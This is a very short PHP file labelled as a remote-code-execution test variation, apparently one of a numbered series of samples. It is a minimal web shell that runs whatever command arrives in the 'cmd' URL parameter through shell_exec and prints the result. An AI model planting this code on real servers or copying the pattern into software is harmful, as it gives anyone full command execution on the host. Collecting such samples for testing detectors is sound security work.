<?php
// RCE test variation #357
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>